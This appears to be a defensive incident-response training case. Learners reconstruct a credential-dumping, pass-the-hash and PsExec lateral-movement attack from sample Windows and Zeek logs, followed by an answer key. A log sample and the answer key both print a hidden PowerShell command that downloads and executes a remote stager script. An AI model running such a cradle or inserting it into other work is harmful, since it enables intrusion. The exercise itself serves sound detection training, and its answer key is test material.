# Case 03 — Credential Access and Lateral Movement

**Difficulty:** Advanced  
**MITRE ATT&CK:** T1003 (Credential Dumping), T1021.002 (SMB), T1550.002 (Pass-the-Hash)  
**Estimated Time:** 60–90 minutes

---

## Scenario

Your SIEM fired multiple alerts over a 2-hour window on a Tuesday evening:

1. **Alert 1 (19:02):** LSASS process access from unusual process on `DESKTOP-WIN10`
2. **Alert 2 (19:18):** NTLM network logon (Type 3) to `WS-SERVER` from `DESKTOP-WIN10`
3. **Alert 3 (19:22):** ADMIN$ share access from `DESKTOP-WIN10` to `WS-SERVER`

This is a multi-stage attack. Your job is to reconstruct the complete kill chain and determine the blast radius.

---

## Available Log Sources

- Sysmon from `DESKTOP-WIN10` (192.168.20.30) and `WS-SERVER` (192.168.20.31)
- Windows Security events from both hosts
- Zeek `conn.log` and `smb_files.log`

---

## Log Samples

### DESKTOP-WIN10 — Sysmon Event ID 10 (19:02:14)

```xml
<EventData>
    <Data Name="SourceProcessId">3892</Data>
    <Data Name="SourceImage">C:\Windows\Temp\update32.exe</Data>
    <Data Name="TargetImage">C:\Windows\System32\lsass.exe</Data>
    <Data Name="GrantedAccess">0x1010</Data>
    <Data Name="CallTrace">C:\Windows\System32\ntdll.dll|C:\Windows\System32\KERNELBASE.dll|...</Data>
</EventData>
```

### DESKTOP-WIN10 — Sysmon Event ID 1 (18:58:33)

```xml
<EventData>
    <Data Name="Image">C:\Windows\Temp\update32.exe</Data>
    <Data Name="CommandLine">C:\Windows\Temp\update32.exe</Data>
    <Data Name="ParentImage">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="ParentCommandLine">powershell.exe -w hidden -nop -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.10.10:8080/stager.ps1')</Data>
    <Data Name="User">DESKTOP-WIN10\jsmith</Data>
</EventData>
```

### WS-SERVER — Windows Security Event 4624 (19:18:45)

```
EventID: 4624
LogonType: 3
AccountName: Administrator
AccountDomain: DESKTOP-WIN10
IpAddress: 192.168.20.30
IpPort: 49812
LogonProcessName: NtLmSsp
AuthenticationPackageName: NTLM
KeyLength: 0
```

### WS-SERVER — Windows Security Event 5140 (19:22:11)

```
EventID: 5140
AccountName: Administrator
IpAddress: 192.168.20.30
ShareName: \\WS-SERVER\ADMIN$
ObjectType: File
AccessMask: 0x1
```

### WS-SERVER — Sysmon Event ID 1 (19:23:55)

```xml
<EventData>
    <Data Name="Image">C:\Windows\System32\PSEXESVC.exe</Data>
    <Data Name="CommandLine">C:\Windows\System32\PSEXESVC.exe</Data>
    <Data Name="ParentImage">C:\Windows\System32\services.exe</Data>
    <Data Name="User">NT AUTHORITY\SYSTEM</Data>
</EventData>
```

### WS-SERVER — Sysmon Event ID 1 (19:24:12)

```xml
<EventData>
    <Data Name="Image">C:\Windows\Temp\srv_agent.exe</Data>
    <Data Name="CommandLine">C:\Windows\Temp\srv_agent.exe</Data>
    <Data Name="ParentImage">C:\Windows\System32\PSEXESVC.exe</Data>
    <Data Name="User">NT AUTHORITY\SYSTEM</Data>
</EventData>
```

### Zeek conn.log (19:18:44 — 19:24:30)

```
ts            id.orig_h      id.resp_h      id.resp_p  proto  orig_bytes  resp_bytes
1705431524.0  192.168.20.30  192.168.20.31  445        tcp    4512        2341
1705431532.0  192.168.20.30  192.168.20.31  445        tcp    192342      89234
1705431655.0  192.168.20.30  192.168.20.31  445        tcp    56789       12345
```

---

## Guiding Questions

1. What is `update32.exe`? How did it get on `DESKTOP-WIN10`?
2. What happened at 19:02:14? What is `GrantedAccess: 0x1010`?
3. Why is the logon at 19:18:45 suspicious even though the account is `Administrator`?
4. What does PSEXESVC.exe indicate? What technique was used?
5. Build the complete attack timeline.
6. Map every event to a MITRE ATT&CK technique.
7. What is the total blast radius? What systems were compromised?
8. What evidence would you collect for a forensic investigation?

---

## Answer Key

<details>
<summary>Click to reveal answers</summary>

### 1. What is update32.exe?

`update32.exe` is a malicious payload disguised as a Windows update utility. It was downloaded via a **PowerShell IEX (Invoke-Expression) cradle** — a common fileless delivery technique. The parent process shows:

```
powershell.exe -w hidden -nop -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.10.10:8080/stager.ps1')
```

This downloads and executes `stager.ps1` from the attacker's HTTP server, which then drops `update32.exe`.

### 2. LSASS Access at 19:02:14

`update32.exe` opened a handle to `lsass.exe` with `GrantedAccess: 0x1010`:
- `0x0010` = `PROCESS_VM_READ` — read process memory
- `0x1000` = `PROCESS_QUERY_LIMITED_INFORMATION` — query process info

Combined (`0x1010`), this is the access pattern for **LSASS memory dumping** (Mimikatz, ProcDump). The attacker extracted NTLM hashes from memory.

### 3. Why is the Administrator Logon Suspicious?

The logon uses:
- **LogonType 3** (network logon)
- **NTLM** authentication (not Kerberos)
- **KeyLength: 0** — indicates pass-the-hash (no actual password used; hash was directly passed)
- **Source:** a workstation (`DESKTOP-WIN10`), not the domain controller

A legitimate administrator would use Kerberos (not NTLM), and would rarely authenticate from a workstation to a server with Type 3 NTLM with zero key length.

### 4. PSEXESVC.exe

The presence of `PSEXESVC.exe` launched by `services.exe` is the signature of **PsExec** remote execution:
- Attacker used the Administrator NTLM hash to authenticate to `WS-SERVER`'s ADMIN$ share
- Uploaded PSEXESVC.exe
- PSEXESVC.exe ran and launched `srv_agent.exe` as SYSTEM

This is **Lateral Movement via SMB/PsExec** (T1021.002 + T1570).

### 5. Complete Attack Timeline

| Time | Host | Event |
|------|------|-------|
| 18:58:33 | DESKTOP-WIN10 | PowerShell cradle downloads stager.ps1, drops update32.exe |
| 19:02:14 | DESKTOP-WIN10 | update32.exe dumps LSASS (extracts Admin NTLM hash) |
| 19:18:44 | Network | SMB connection from DESKTOP-WIN10 to WS-SERVER:445 |
| 19:18:45 | WS-SERVER | Network logon (Type 3 NTLM) as Administrator from 192.168.20.30 |
| 19:22:11 | WS-SERVER | ADMIN$ share accessed from DESKTOP-WIN10 |
| 19:23:55 | WS-SERVER | PSEXESVC.exe starts (PSExec service installed) |
| 19:24:12 | WS-SERVER | srv_agent.exe runs as SYSTEM via PSExec |

### 6. MITRE ATT&CK Mapping

| Technique | ID | Evidence |
|-----------|----|---------|
| PowerShell Cradle | T1059.001 | `IEX (New-Object Net.WebClient).DownloadString(...)` |
| Ingress Tool Transfer | T1105 | update32.exe downloaded from 192.168.10.10 |
| OS Credential Dumping (LSASS) | T1003.001 | Sysmon Event 10, GrantedAccess=0x1010 |
| Pass-the-Hash | T1550.002 | Type 3 NTLM logon, KeyLength=0 |
| SMB / Windows Admin Shares | T1021.002 | ADMIN$ share access, Event 5140 |
| Remote Service Execution | T1569.002 | PSEXESVC.exe launched by services.exe |

### 7. Blast Radius

**Confirmed compromised:**
- `DESKTOP-WIN10` — initial foothold, LSASS dumped
- `WS-SERVER` — lateral movement target, SYSTEM shell obtained

**Potentially at risk:**
- Any other host in the victim network reachable via SMB with the same Administrator hash
- Domain controller if the Admin hash is a domain admin credential

### 8. Forensic Evidence to Collect

- Memory dump of `DESKTOP-WIN10` (before reboot) — may contain injected code and decrypted hash material
- Copy of `update32.exe` and `srv_agent.exe` — submit to VirusTotal / sandbox
- Full EVTX logs from both hosts
- Network packet capture from Zeek for the 18:50–19:30 window
- `stager.ps1` from attacker HTTP server logs (if accessible)
- Check Sysmon Event 11 (FileCreate) for any other files dropped

</details>

---

## Report Template

Document your findings using: [../../reports/incident-report-template.md](../../reports/incident-report-template.md)
